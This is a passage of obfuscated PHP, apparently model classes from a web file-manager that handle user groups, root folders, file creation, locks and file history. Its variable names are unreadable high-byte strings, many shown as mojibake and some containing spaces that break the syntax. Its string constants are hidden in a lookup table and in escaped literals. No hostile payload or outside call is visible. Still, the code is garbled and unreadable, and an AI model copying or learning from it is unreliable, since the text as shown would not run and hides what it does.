array_values($˘Ø¢µè[$√√îÎ≠—[364]]); $˘Ø¢µè[$√√îÎ≠—[361]] = array($√√îÎ≠—[2051] => count($˘Ø¢µè[$√√îÎ≠—[364]]), $√√îÎ≠—[2049] => $˘Ø¢µè[$√√îÎ≠—[361]][$√√îÎ≠—[358]], $√√îÎ≠—[2048] => 1, $√√îÎ≠—[2050] => 1); } private function _searchFromMeta($ö≥™≥Ï™, $πı◊◊áı, $ã—ê÷Ôè) { $∆Çäòù– =& $_SERVER[Çâä∆◊¡]; $πı◊◊áı = strtolower($πı◊◊áı); $±ãâ¢’ﬂ = array($∆Çäòù–[95] => $ö≥™≥Ï™, $∆Çäòù–[369] => array($∆Çäòù–[378], "\45{$πı◊◊áı}\45")); $±ãâ¢’ﬂ = $this->parseWhereLike($±ãâ¢’ﬂ); $ﬁ¥ò‚∑ê = Model($∆Çäòù–[2278])->where($±ãâ¢’ﬂ)->limit($ã—ê÷Ôè)->select(); if (!$ﬁ¥ò‚∑ê) { return array(); } $ﬁ¥ò‚∑ê = array_to_keyvalue($ﬁ¥ò‚∑ê, $∆Çäòù–[12], $∆Çäòù–[1642]); $Ëû≥∑«õ = $this->where(array($∆Çäòù–[1633] => array($∆Çäòù–[7], $ﬁ¥ò‚∑ê)))->select(); if (!$Ëû≥∑«õ) { return array(); } return $Ëû≥∑«õ; } private function _listDataApplyItem($·ÒíÃ¸è) { $ÇõÜÃæ⁄ = array($·ÒíÃ¸è); $this->_listDataApply($ÇõÜÃæ⁄); return $ÇõÜÃæ⁄[0]; } private function _listDataApply(&$∫ú‹¯ÌÀ) { $›©¿Â¿¡ =& $_SERVER[Çâä∆◊¡]; if (!$∫ú‹¯ÌÀ) { return; } array_remove_key($∫ú‹¯ÌÀ, $›©¿Â¿¡[876]); $í …°ßõ = array_to_keyvalue($∫ú‹¯ÌÀ, $›©¿Â¿¡[12], $›©¿Â¿¡[1642]); $this->_listAppendGroup($∫ú‹¯ÌÀ, $í …°ßõ); $this->_listAppendMeta($∫ú‹¯ÌÀ, $í …°ßõ); $this->_listAppendSourceRoot($∫ú‹¯ÌÀ, $í …°ßõ); } private function _listAppendSourceRoot(&$¸ﬁéó˛ﬂ, $–†Û—∏Ω) { $åß∆ÚË˝ =& $_SERVER[Çâä∆◊¡]; $Ñ¶ï£Í¸ = Model($åß∆ÚË˝[818])->listSourceRoot(SourceModel::TYPE_USER, $–†Û—∏Ω); $Ñ¶ï£Í¸ = array_to_keyvalue($Ñ¶ï£Í¸, $åß∆ÚË˝[504]); $Ñ¶ï£Í¸ = array_remove_key($Ñ¶ï£Í¸, $åß∆ÚË˝[504]); foreach ($¸ﬁéó˛ﬂ as &$‡ñÜú≤ï) { $‡ñÜú≤ï[$åß∆ÚË˝[87]] = $Ñ¶ï£Í¸[$‡ñÜú≤ï[$åß∆ÚË˝[1642]]] ? $Ñ¶ï£Í¸[$‡ñÜú≤ï[$åß∆ÚË˝[1642]]] : array(); } unset($‡ñÜú≤ï); } private function _listAppendGroup(&$—œûß», $“ã¡»•) { $Ò†ﬁÇèê =& $_SERVER[Çâä∆◊¡]; $‹‹¸—íó = array($Ò†ﬁÇèê[1642] => array($Ò†ﬁÇèê[7], $“ã¡»•)); $‡”‰æ´Ω = Model($Ò†ﬁÇèê[1899])->where($‹‹¸—íó)->select(); $Ωº•™Áè = array_to_keyvalue($‡”‰æ´Ω, $Ò†ﬁÇèê[12], $Ò†ﬁÇèê[1810]); $Ωº•™Áè = array_remove_value(array_unique($Ωº•™Áè), $Ò†ﬁÇèê[190]); if (!$Ωº•™Áè || !$‡”‰æ´Ω) { return; } $‹‹¸—íó = array($Ò†ﬁÇèê[1810] => array($Ò†ﬁÇèê[7], $Ωº•™Áè)); $Ñç—°õ = Model($Ò†ﬁÇèê[1986])->field($Ò†ﬁÇèê[2279])->where($‹‹¸—íó)->select(); $Ñç—°õ = array_to_keyvalue($Ñç—°õ, $Ò†ﬁÇèê[1810]); $‡”‰æ´Ω = array_to_keyvalue_group($‡”‰æ´Ω, $Ò†ﬁÇèê[1642]); foreach ($‡”‰æ´Ω as &$¡–…àó‹) { $àÄìí»ı = array(); foreach ($¡–…àó‹ as $Óú≤´ûÎ) { if (!$Óú≤´ûÎ[$Ò†ﬁÇèê[1911]]) { continue; } $≠ê¡¡€ = Model($Ò†ﬁÇèê[507])->listData($Óú≤´ûÎ[$Ò†ﬁÇèê[1911]]); $àÄìí»ı[] = array($Ò†ﬁÇèê[1810] => $Óú≤´ûÎ[$Ò†ﬁÇèê[1810]], $Ò†ﬁÇèê[2280] => $Ñç—°õ[$Óú≤´ûÎ[$Ò†ﬁÇèê[1810]]][$Ò†ﬁÇèê[32]], $Ò†ﬁÇèê[521] => $Ñç—°õ[$Óú≤´ûÎ[$Ò†ﬁÇèê[1810]]][$Ò†ﬁÇèê[521]], $Ò†ﬁÇèê[414] => $≠ê¡¡€); } $¡–…àó‹ = $àÄìí»ı; } unset($¡–…àó‹); foreach ($—œûß» as &$Õ˙◊’ÔÚ) { $Õ˙◊’ÔÚ[$Ò†ﬁÇèê[1988]] = array(); if (isset($‡”‰æ´Ω[$Õ˙◊’ÔÚ[$Ò†ﬁÇèê[1642]]])) { $Õ˙◊’ÔÚ[$Ò†ﬁÇèê[1988]] = $‡”‰æ´Ω[$Õ˙◊’ÔÚ[$Ò†ﬁÇèê[1642]]]; } } unset($Õ˙◊’ÔÚ); } public function userAppendGroup($ÃÙÕ´åä) { $ç∏â«Í˙ =& $_SERVER[Çâä∆◊¡]; if (!$ÃÙÕ´åä) { return array(); } $this->_listAppendGroup($ÃÙÕ´åä, array_to_keyvalue($ÃÙÕ´åä, $ç∏â«Í˙[12], $ç∏â«Í˙[1642])); return $ÃÙÕ´åä; } private function _listAppendMeta(&$ïˆœ»⁄º, $‡É“„Á†) { $†µÇãµø =& $_SERVER[Çâä∆◊¡]; $¨˝ÜŒï¿ = UserJobModel::JOB_KEY; $ı‹¯Óæ≤ = array($†µÇãµø[2260]); $¥º™œ¯‡ = array($†µÇãµø[1642] => array($†µÇãµø[7], $‡É“„Á†)); $ ò«§¶’ = Model($†µÇãµø[2258])->where($¥º™œ¯‡)->select(); $ ò«§¶’ = array_to_keyvalue_group($ ò«§¶’, $†µÇãµø[1642]); foreach ($ ò«§¶’ as &$ê˘ûãÜï) { $…¥⁄ªˆû = array(); foreach ($ê˘ûãÜï as $œÇ ûÚ§) { if (!in_array($œÇ ûÚ§[$†µÇãµø[95]], $ı‹¯Óæ≤)) { $…¥⁄ªˆû[$œÇ ûÚ§[$†µÇãµø[95]]] = $œÇ ûÚ§[$†µÇãµø[369]]; } } $ê˘ûãÜï = $…¥⁄ªˆû; } unset($ê˘ûãÜï); $˝˙–À¬Ì = Model($†µÇãµø[2281]); foreach ($ïˆœ»⁄º as &$±±À¶‰À) { $˚ê√ÁÔˆ = array(); if (isset($ ò«§¶’[$±±À¶‰À[$†µÇãµø[1642]]])) { $˚ê√ÁÔˆ = $ ò«§¶’[$±±À¶‰À[$†µÇãµø[1642]]]; } $±±À¶‰À[$†µÇãµø[2282]] = array(); if (isset($˚ê√ÁÔˆ[$¨˝ÜŒï¿])) { $±±À¶‰À[$†µÇãµø[2282]] = $˝˙–À¬Ì->getUserJobInfo($˚ê√ÁÔˆ[$¨˝ÜŒï¿]); } } unset($±±À¶‰À); } protected function groupUserAll($∑öÀ§Ëˆ) { $ÜÇ°¿∆Ó =& $_SERVER[Çâä∆◊¡]; if (!$∑öÀ§Ëˆ) { return !1; } $‘â“Á‹À = Model($ÜÇ°¿∆Ó[1899])->field($ÜÇ°¿∆Ó[1642])->where(array($ÜÇ°¿∆Ó[1810] => array($ÜÇ°¿∆Ó[7], $∑öÀ§Ëˆ)))->select(); $‘â“Á‹À = array_to_keyvalue($‘â“Á‹À, $ÜÇ°¿∆Ó[12], $ÜÇ°¿∆Ó[1642]); return array_unique($‘â“Á‹À); } public function userSearch($∂àπ⁄øÔ, $Èç„∫ä¢ = "\x2a") { return Model($_SERVER[Çâä∆◊¡][538])->where($∂àπ⁄øÔ)->field($Èç„∫ä¢)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\x72\x5f\x6f\160\x74\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($à†âÁÿÃ) { $ï⁄Ÿû€ù =& $_SERVER[Çâä∆◊¡]; if (!defined($ï⁄Ÿû€ù[474])) { define($ï⁄Ÿû€ù[474], 0); } return "\x55\163\145\162\117\x70\164\151\157\156\x5f{$à†âÁÿÃ}\x5f" . USER_ID; } protected function filterWhere($ÿ∂ÂïùÇ) { $ŒªçñÇø =& $_SERVER[Çâä∆◊¡]; if (!defined($ŒªçñÇø[474])) { define($ŒªçñÇø[474], 0); } $ÿ∂ÂïùÇ[$ŒªçñÇø[1642]] = USER_ID; return $ÿ∂ÂïùÇ; } public function cacheRemoveUser($ô˚ﬂÓã√, $èªñãŸ¢) { return Cache::remove("\x55\163\145\162\117\160\x74\151\157\156\137{$ô˚ﬂÓã√}\x5f" . $èªñãŸ¢); } protected function optionDefault($¿°ÂÇŒ‰ = '') { $Ü›ﬁ“ƒ¨ =& $_SERVER[Çâä∆◊¡]; if ($¿°ÂÇŒ‰ == $Ü›ﬁ“ƒ¨[12]) { return $GLOBALS[$Ü›ﬁ“ƒ¨[6]][$Ü›ﬁ“ƒ¨[2283]]; } if ($¿°ÂÇŒ‰ == $Ü›ﬁ“ƒ¨[2284]) { return $GLOBALS[$Ü›ﬁ“ƒ¨[6]][$Ü›ﬁ“ƒ¨[2285]]; } } } goto E¯µ≥æ¶¢«; AÔ¡£çØ‰”: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ú¥È˜⁄√) { $ñ¸Á•›Í =& $_SERVER[Çâä∆◊¡]; $∂•Ú§Øè = Model($ñ¸Á•›Í[513])->where(array($ñ¸Á•›Í[1633] => $ú¥È˜⁄√))->find(); $€ÓÙõ€Ω = $this->_mkdirRoot(SourceModel::TYPE_USER, $ú¥È˜⁄√, $∂•Ú§Øè[$ñ¸Á•›Í[32]]); $this->userDesktopAdd($€ÓÙõ€Ω); return $€ÓÙõ€Ω; } public function userDesktopAdd($É˜¸ Ñ⁄) { $∑“≥ø”≈ =& $_SERVER[Çâä∆◊¡]; $ÃﬁÏñ√ê = LNG($∑“≥ø”≈[2072]); $í‰≠¡§≠ = $this->mkdir($É˜¸ Ñ⁄, $ÃﬁÏñ√ê); $this->metaSet($í‰≠¡§≠, $∑“≥ø”≈[2073], $∑“≥ø”≈[89]); $this->metaSet($É˜¸ Ñ⁄, $∑“≥ø”≈[2074], $í‰≠¡§≠); } public function groupRootAdd($ÑöÿÊíñ) { $Û¥›ﬁ‚ã =& $_SERVER[Çâä∆◊¡]; $®˛∞÷ÑÄ = Model($Û¥›ﬁ‚ã[522])->where(array($Û¥›ﬁ‚ã[1897] => $ÑöÿÊíñ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ÑöÿÊíñ, $®˛∞÷ÑÄ[$Û¥›ﬁ‚ã[32]]); } public function systemRootPathAdd($Ã˝¶ﬁ±˙) { if ($Ã˝¶ﬁ±˙ != $_SERVER[Çâä∆◊¡][537]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $Ã˝¶ﬁ±˙); } public function userRootRemove($–»¬™çÈ) { $‘´ õ„Ÿ = $this->sourceRoot(SourceModel::TYPE_USER, $–»¬™çÈ); if (!$‘´ õ„Ÿ) { return; } $this->remove($‘´ õ„Ÿ, !1); } public function groupRootRemove($Ñ¡çºÂ≠) { $Ïß ﬁ∑¸ = $this->sourceRoot(SourceModel::TYPE_GROUP, $Ñ¡çºÂ≠); if (!$Ïß ﬁ∑¸) { return; } $this->remove($Ïß ﬁ∑¸, !1); } private function _mkdirRoot($î÷·ÌØ«, $≈◊˙ç·°, $Œ‘ïæê≈) { $ÿ¢ÈÀù… =& $_SERVER[Çâä∆◊¡]; $“Ã”°ø√ = array($ÿ¢ÈÀù…[402] => 0, $ÿ¢ÈÀù…[580] => $î÷·ÌØ«, $ÿ¢ÈÀù…[581] => $≈◊˙ç·°, $ÿ¢ÈÀù…[577] => 1, $ÿ¢ÈÀù…[582] => USER_ID, $ÿ¢ÈÀù…[583] => USER_ID, $ÿ¢ÈÀù…[578] => $ÿ¢ÈÀù…[12], $ÿ¢ÈÀù…[584] => $ÿ¢ÈÀù…[531], $ÿ¢ÈÀù…[430] => 0, $ÿ¢ÈÀù…[579] => 0, $ÿ¢ÈÀù…[468] => 0, $ÿ¢ÈÀù…[585] => $ÿ¢ÈÀù…[12]); if ($∆»í™µÓ = $this->where($“Ã”°ø√)->find()) { return $∆»í™µÓ[$ÿ¢ÈÀù…[403]]; } $Å‚ˆá Ö = "\115\157\144\145\154\123\157\x75\x72\x63\x65\x2e\155\153\144\x69\162\122\x6f\157\x74\56{$î÷·ÌØ«}\56{$≈◊˙ç·°}\56" . $Œ‘ïæê≈; CacheLock::lock($Å‚ˆá Ö); $“Ã”°ø√[$ÿ¢ÈÀù…[32]] = $Œ‘ïæê≈; $Œù∑È¢ç = $this->add($“Ã”°ø√); $ƒ¡¶Ñø… = array($ÿ¢ÈÀù…[586] => short_id($Œù∑È¢ç)); $this->where(array($ÿ¢ÈÀù…[418] => $Œù∑È¢ç))->save($ƒ¡¶Ñø…); CacheLock::unlock($Å‚ˆá Ö); return $Œù∑È¢ç; } private function sourceRoot($ É∆ÂÚ‰, $¶ÍºÑöö, $ÑÑµÏˆô = false) { $¸’Ô®ªù =& $_SERVER[Çâä∆◊¡]; $Ô¸Ú±•¯ = array($¸’Ô®ªù[402] => 0, $¸’Ô®ªù[580] => $ É∆ÂÚ‰, $¸’Ô®ªù[581] => $¶ÍºÑöö); if ($•‹ìÁß• = $this->where($Ô¸Ú±•¯)->find()) { return $ÑÑµÏˆô ? $•‹ìÁß• : $•‹ìÁß•[$¸’Ô®ªù[403]]; } return !1; } public function sourceRootGroup($ï˛˜ñ‹¡) { $∑ˆèÁ„◊ =& $_SERVER[Çâä∆◊¡]; if (is_string($ï˛˜ñ‹¡)) { $ï˛˜ñ‹¡ = array($ï˛˜ñ‹¡); } $§“˜ÎÍ∞ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ï˛˜ñ‹¡, $∑ˆèÁ„◊[181]); $«¸è≠¬’ = array($∑ˆèÁ„◊[364] => $§“˜ÎÍ∞, $∑ˆèÁ„◊[361] => array($∑ˆèÁ„◊[752] => count($ï˛˜ñ‹¡))); $this->_listDataApply($«¸è≠¬’[$∑ˆèÁ„◊[364]]); $this->_listMake($«¸è≠¬’); return array_to_keyvalue($«¸è≠¬’[$∑ˆèÁ„◊[77]], $∑ˆèÁ„◊[504]); } public function mkfile($è“¨à÷”, $—‹ÿ—Î”, $°∞Ò’Òâ = '', $ÍØ„åÊÜ = REPEAT_RENAME) { $Í˛÷•õñ =& $_SERVER[Çâä∆◊¡]; $‘˛ıŸîπ = Model($Í˛÷•õñ[603])->addFileByContent($°∞Ò’Òâ, $—‹ÿ—Î”); return $this->_createFileCall($è“¨à÷”, $—‹ÿ—Î”, $‘˛ıŸîπ, $ÍØ„åÊÜ, $Í˛÷•õñ[1323]); } public function addFile($Ù≈∑˛«Ã, $Ûñ¨ƒ‘•, $“›√Æ±Ô, $§Ã≈Ø‰π = false, $”À±Çÿ£ = REPEAT_RENAME) { $Ñ‚˚≠¥‡ = Model($_SERVER[Çâä∆◊¡][603])->addFile($Ûñ¨ƒ‘•, $“›√Æ±Ô, $§Ã≈Ø‰π); return $this->_createFileCall($Ù≈∑˛«Ã, $“›√Æ±Ô, $Ñ‚˚≠¥‡, $”À±Çÿ£); } public function addFileByFileID($ˆìÙáåŸ, $öÜ˚æ¨ß, $˚ÿ¡ﬂœÍ, $˘±“Ê¢‚ = REPEAT_RENAME) { $˘·û·Íù =& $_SERVER[Çâä∆◊¡]; $áüî•ﬁ· = Model($˘·û·Íù[603])->find($öÜ˚æ¨ß); Model($˘·û·Íù[603])->linkAdd($öÜ˚æ¨ß); return $this->_createFileCall($ˆìÙáåŸ, $˚ÿ¡ﬂœÍ, $áüî•ﬁ·, $˘±“Ê¢‚); } public function addFileByRemote($ãÙìù∫◊, $…ì‚ˆ†ª, $•‘∑ Í˝, $¨°”£Ë¥ = array(), $”òÌ·˜‚ = REPEAT_RENAME) { $·Ÿ“Ëæ„ = Model($_SERVER[Çâä∆◊¡][603])->addFileByRemote($…ì‚ˆ†ª, $•‘∑ Í˝, $¨°”£Ë¥); return $this->_createFileCall($ãÙìù∫◊, $•‘∑ Í˝, $·Ÿ“Ëæ„, $”òÌ·˜‚); } private function _createFileCall($öÉÌ¥·£, $˛…ïç÷ﬂ, $˘ ‹ﬁ∞‚, $ùºî∆ﬂÀ, $∆ë•ƒΩΩ = "\165\160\x6c\157\141\144") { $≤ ÿ≤Ø” =& $_SERVER[Çâä∆◊¡]; $≠Ò÷Ü“® = !1; $this->setMasterDB(); $this->lockWriteStart($öÉÌ¥·£, $˛…ïç÷ﬂ); $ü∏ÿ˚∏à = $this->fileNameExist($öÉÌ¥·£, $˛…ïç÷ﬂ); $Ú˚‚Ÿë = $this->_createFile($öÉÌ¥·£, $˛…ïç÷ﬂ, $˘ ‹ﬁ∞‚, $ùºî∆ﬂÀ, $≠Ò÷Ü“®); if (!$≠Ò÷Ü“®) { Model($≤ ÿ≤Ø”[470])->remove($˘ ‹ﬁ∞‚[$≤ ÿ≤Ø”[467]]); } if ($≠Ò÷Ü“® && $Ú˚‚Ÿë && $Ú˚‚Ÿë != $ü∏ÿ˚∏à) { Model($≤ ÿ≤Ø”[2045])->eventCreate($Ú˚‚Ÿë, $∆ë•ƒΩΩ); } $this->lockWriteEnd($öÉÌ¥·£, $˛…ïç÷ﬂ); return $Ú˚‚Ÿë; } public function mkdir($˘ó≈àúµ, $À¬Œ©•™, $â˛ñ¡∞ï = REPEAT_SKIP) { $ç« ¶ã˘ =& $_SERVER[Çâä∆◊¡]; $this->setMasterDB(); $ÆÒŒπ÷Ÿ = $this->sourceInfo($˘ó≈àúµ); if (!$ÆÒŒπ÷Ÿ) { return !1; } $this->lockWriteStart($˘ó≈àúµ, $À¬Œ©•™); if ($â˛ñ¡∞ï !== !1) { $æÉ˘Ö•Ä = $this->fileNameExist($˘ó≈àúµ, $À¬Œ©•™); if ($æÉ˘Ö•Ä && $â˛ñ¡∞ï != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($˘ó≈àúµ, $À¬Œ©•™); return $æÉ˘Ö•Ä; } $À¬Œ©•™ = $this->fileNameAuto($˘ó≈àúµ, $À¬Œ©•™, $â˛ñ¡∞ï); } $˘Æ◊ü“Ä = array($ç« ¶ã˘[577] => 1, $ç« ¶ã˘[421] => $À¬Œ©•™, $ç« ¶ã˘[578] => $ç« ¶ã˘[12], $ç« ¶ã˘[468] => 0, $ç« ¶ã˘[579] => 0); $ëÔª«·Û = $this->_addSource($˘Æ◊ü“Ä, $ÆÒŒπ÷Ÿ); Model($ç« ¶ã˘[2045])->eventCreate($ëÔª«·Û, $ç« ¶ã˘[1324]); $this->lockWriteEnd($˘ó≈àúµ, $À¬Œ©•™); return $ëÔª«·Û; } public function listSourceRoot($…Â©£°≠, $≈á“Ì°¯, $å≈Í∂êÙ = "\163\157\165\x72\143\145\111\104\x2c\x74\141\x72\147\x65\164\111\x44\54\163\151\172\x65") { $⁄ˆî‰ç¨ =& $_SERVER[Çâä∆◊¡]; $ûºì∂âÁ = $⁄ˆî‰ç¨[373]; $“¿“Äˆ∏ = array(); $„ƒúçÅ∑ = 1024 * 50; $µ©´Ÿ™˜ = is_array($µ©´Ÿ™˜) ? $µ©´Ÿ™˜ : array(); $”‘ÿ∏⁄µ = count($≈á“Ì°¯); $©•¸º‘Á = $this->tablePrefix . $⁄ˆî‰ç¨[2075]; for ($ÖÓ†˝“» = 0; $ÖÓ†˝“» < $”‘ÿ∏⁄µ; $ÖÓ†˝“»++) { $«òÈ˙Ù‘ = $≈á“Ì°¯[$ÖÓ†˝“»]; $ûºì∂âÁ .= "\x53\x45\x4c\x45\x43\x54\40\52\40\106\122\x4f\x4d\40\50\x53\x45\x4c\105\103\x54\40{$å≈Í∂êÙ}\40\x46\122\x4f\115\40\x60{$©•¸º‘Á}\140\x20\127\110\105\x52\105\40"; $ûºì∂âÁ .= "\x60\160\x61\x72\x65\156\164\x49\x44\x60\x3d\60\x20\101\x4e\x44\40\x60\x74\141\162\x67\145\164\x49\104\x60\75{$«òÈ˙Ù‘}\40\x41\116\104\40\x60\164\141\x72\147\x65\164\x54\171\x70\x65\140\x3d{$…Â©£°≠}\x20\x6c\x69\x6d\151\164\40\x31\51\x20\141\163\40\164\x62\x5f{$ÖÓ†˝“»}\x20\x55\116\x49\117\x4e\x20\x41\x4c\x4c\x20"; if ((strlen($ûºì∂âÁ) >= $„ƒúçÅ∑ || $ÖÓ†˝“» == $”‘ÿ∏⁄µ - 1) && $ûºì∂âÁ) { $ûºì∂âÁ = substr($ûºì∂âÁ, 0, -strlen($⁄ˆî‰ç¨[1025])); $¶Äé•¢ä = $this->query($ûºì∂âÁ); $ûºì∂âÁ = $⁄ˆî‰ç¨[12]; $“¿“Äˆ∏ = array_merge($“¿“Äˆ∏, $¶Äé•¢ä); } } return $“¿“Äˆ∏; } private function _createFile($Ç˜â–ÎÀ, $Û–≤ö«Œ, $Ø®íÕ§é, $èèËìÜ±, &$Õœ‹¬µ¶) { $°ûà¸∞û =& $_SERVER[Çâä∆◊¡]; $„–°ã„à = $this->sourceInfo($Ç˜â–ÎÀ); if (!$Ø®íÕ§é || !$„–°ã„à) { return !1; } if ($èèËìÜ± !== !1) { $œ‰Óê∂– = $this->fileNameExist($Ç˜â–ÎÀ, $Û–≤ö«Œ); } $Õœ‹¬µ¶ = !0; if ($èèËìÜ± && $œ‰Óê∂–) { if ($èèËìÜ± == REPEAT_SKIP) { $Õœ‹¬µ¶ = !1; return $œ‰Óê∂–; } else { if ($èèËìÜ± == REPEAT_REPLACE) { $¨ªˆ´√Ω = $this->sourceInfo($œ‰Óê∂–); $‰‘¬˘ô = $this->fileHistory($¨ªˆ´√Ω, $Ø®íÕ§é[$°ûà¸∞û[467]], $Ø®íÕ§é[$°ûà¸∞û[80]]); if (!$‰‘¬˘ô) { $Õœ‹¬µ¶ = !1; } else { $this->folderSizeReset($Ç˜â–ÎÀ); } return $œ‰Óê∂–; } else { $Û–≤ö«Œ = $this->fileNameAuto($Ç˜â–ÎÀ, $Û–≤ö«Œ, $èèËìÜ±, !1); } } } $Ô‰◊¿µ¡ = array($°ûà¸∞û[577] => 0, $°ûà¸∞û[421] => $Û–≤ö«Œ, $°ûà¸∞û[578] => substr(get_path_ext($Û–≤ö«Œ), 0, 10), $°ûà¸∞û[468] => $Ø®íÕ§é[$°ûà¸∞û[467]], $°ûà¸∞û[579] => $Ø®íÕ§é[$°ûà¸∞û[80]]); $ÁæÅûÿà = $this->_addSource($Ô‰◊¿µ¡, $„–°ã„à); $this->folderSizeReset($Ç˜â–ÎÀ, intval($Ô‰◊¿µ¡[$°ûà¸∞û[80]])); return $ÁæÅûÿà; } protected function fileHistory($‘êßÓ◊∑, $‰πÜãÄ©, $Û·ïãí≠) { $éˆà˚ô´ =& $_SERVER[Çâä∆◊¡]; $˘Òö‰°ó = defined($éˆà˚ô´[474]) ? USER_ID : $éˆà˚ô´[190]; if ($‘êßÓ◊∑[$éˆà˚ô´[467]] == $‰πÜãÄ©) { return !1; } $this->checkLock($‘êßÓ◊∑[$éˆà˚ô´[403]], $‰πÜãÄ©); Model($éˆà˚ô´[2076])->addHistory($‘êßÓ◊∑); $õÇÊÜêÿ = array($éˆà˚ô´[583] => $˘Òö‰°ó, $éˆà˚ô´[425] => time(), $éˆà˚ô´[467] => $‰πÜãÄ©, $éˆà˚ô´[80] => $Û·ïãí≠); $this->where(array($éˆà˚ô´[418] => $‘êßÓ◊∑[$éˆà˚ô´[403]]))->save($õÇÊÜêÿ); $this->sourceCacheClear($‘êßÓ◊∑[$éˆà˚ô´[403]]); return !0; } public function checkLock($ΩôÑÛ«î, $îªÙ¨÷) { $∏¯Í˛∞… =& $_SERVER[Çâä∆◊¡]; $»∑¶Ô¯¢ = $this->pathInfo($ΩôÑÛ«î); if (!$this->fileIsLock($»∑¶Ô¯¢, !0)) { return; } $ì≈¿ªúØ = Session::get($∏¯Í˛∞…[2077]); $Ä€¥Ïä = substr($»∑¶Ô¯¢[$∏¯Í˛∞…[32]], 0, -1 - strlen($»∑¶Ô¯¢[$∏¯Í˛∞…[167]])) . $∏¯Í˛∞…[1591] . $ì≈¿ªúØ . $∏¯Í˛∞…[10] . $»∑¶Ô¯¢[$∏¯Í˛∞…[167]]; $óû˘Ïà˙ = Model($∏¯Í˛∞…[603])->find($îªÙ¨÷); $this->_createFileCall($»∑¶Ô¯¢[$∏¯Í˛∞…[498]], $Ä€¥Ïä, $óû˘Ïà˙, REPEAT_REPLACE, $∏¯Í˛∞…[1323]); $¿¿˚Äìâ = $»∑¶Ô¯¢[$∏¯Í˛∞…[465]][$∏¯Í˛∞…[542]]; $Ó®‰ì˚¨ = $¿¿˚Äìâ[$∏¯Í˛∞…[2078]] ? $¿¿˚Äìâ[$∏¯Í˛∞…[2078]] : $¿¿˚Äìâ[$∏¯Í˛∞…[32]]; show_json(LNG($∏¯Í˛∞…[2079]) . $∏¯Í˛∞…[2080] . LNG($∏¯Í˛∞…[2081]) . $∏¯Í˛∞…[2082] . $Ó®‰ì˚¨ . $∏¯Í˛∞…[2083], !1); } public function fileIsLock($Ã˜“õü, $∑åíÀõÏ = false) { $ÜÊ¶Ô»Ç =& $_SERVER[Çâä∆◊¡]; if (!isset($Ã˜“õü[$ÜÊ¶Ô»Ç[465]]) || !$Ã˜“õü[$ÜÊ¶Ô»Ç[465]][$ÜÊ¶Ô»Ç[539]]) { return !1; } if ($Ã˜“õü[$ÜÊ¶Ô»Ç[465]][$ÜÊ¶Ô»Ç[539]] != USER_ID) { return !0; } $∂˙Ø¨‹÷ = $GLOBALS[$ÜÊ¶Ô»Ç[6]][$ÜÊ¶Ô»Ç[90]][$ÜÊ¶Ô»Ç[540]]; if ($Ã˜“õü[$ÜÊ¶Ô»Ç[465]][$ÜÊ¶Ô»Ç[541]] <= time() - $∂˙Ø¨‹÷) { $this->metaSet($Ã˜“õü[$ÜÊ¶Ô»Ç[403]], $ÜÊ¶Ô»Ç[539], null); $this->metaSet($Ã˜“õü[$ÜÊ¶Ô»Ç[403]], $ÜÊ¶Ô»Ç[541], null); } if ($∑åíÀõÏ) { $this->metaSet($Ã˜“õü[$ÜÊ¶Ô»Ç[403]], $ÜÊ¶Ô»Ç[541], time()); } return !1; } private function _addSource($Õí®Øƒ”, $¬á¨ÌöË) { $åÓ‰í¶Â =& $_SERVER[Çâä∆◊¡]; $ï›¢Ëäá = defined($åÓ‰í¶Â[474]) ? USER_ID : $åÓ‰í¶Â[190]; $ ©Ù≥òå = array($åÓ‰í¶Â[580] => $¬á¨ÌöË[$åÓ‰í¶Â[412]], $åÓ‰í¶Â[581] => $¬á¨ÌöË[$åÓ‰í¶Â[504]], $åÓ‰í¶Â[582] => $ï›¢Ëäá, $åÓ‰í¶Â[583] => $ï›¢Ëäá, $åÓ‰í¶Â[402] => $¬á¨ÌöË[$åÓ‰í¶Â[403]], $åÓ‰í¶Â[584] => $¬á¨ÌöË[$åÓ‰í¶Â[521]] . $¬á¨ÌöË[$åÓ‰í¶Â[403]] . $åÓ‰í¶Â[50], $åÓ‰í¶Â[430] => 0, $åÓ‰í¶Â[585] => $åÓ‰í¶Â[12]); $Õí®Øƒ” = array_merge($ ©Ù≥òå, $Õí®Øƒ”); $this->updateModifyTime($Õí®Øƒ”[$åÓ‰í¶Â[498]]); $Æÿ∆Íò¨ = $åÓ‰í¶Â[2084] . $¬á¨ÌöË[$åÓ‰í¶Â[403]]; if (isset(self::$cacheChildList[$Æÿ∆Íò¨])) { unset(self::$cacheChildList[$Æÿ∆Íò¨]); } static $ÜÆÈ‹Ù¥ = false; if (!$ÜÆÈ‹Ù¥) { Hook::trigger($åÓ‰í¶Â[567], $Õí®Øƒ”); $ÜÆÈ‹Ù¥ = !0; } $œŸ‡Éå = $this->add($Õí®Øƒ”); $Î‘‚ÁäÖ = array($åÓ‰í¶Â[586] => short_id($œŸ‡Éå)); $this->where(array($åÓ‰í¶Â[418] => $œŸ‡Éå))->save($Î‘‚ÁäÖ); $this->setNamePinyin($œŸ‡Éå, $Õí®Øƒ”[$åÓ‰í¶Â[32]]); return $œŸ‡Éå; } public function remove($˘–∏ûÛ•, $Â£ﬁï÷´ = true) { $àÕË≠∂À =& $_SERVER[Çâä∆◊¡]; $”¶È∆Ô¯ = $this->sourceInfo($˘–∏ûÛ•); $áÃÖï˛Ê = intval($”¶È∆Ô¯[$àÕË≠∂À[412]]) === self::TYPE_SYSTEM; $í€≈§¶ì = Model($àÕË≠∂À[433])->get($àÕË≠∂À[2085]) == $àÕË≠∂À[89]; if ($áÃÖï˛Ê || $Â£ﬁï÷´ || !$í€≈§¶ì) { return $this->removeNow($˘–∏ûÛ•, $Â£ﬁï÷´); } $¨¿ﬁ⁄¥Ë = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $·™±çﬂ≤ = $”¶È∆Ô¯[$àÕË≠∂À[412]] == self::TYPE_USER ? $àÕË≠∂À[594] : $àÕË≠∂À[515]; if ($·™±çﬂ≤ == $àÕË≠∂À[594]) { $…ªëî¨˚ = Model($àÕË≠∂À[513])->getInfo($”¶È∆Ô¯[$àÕË≠∂À[504]]); $Ú€œœòü = 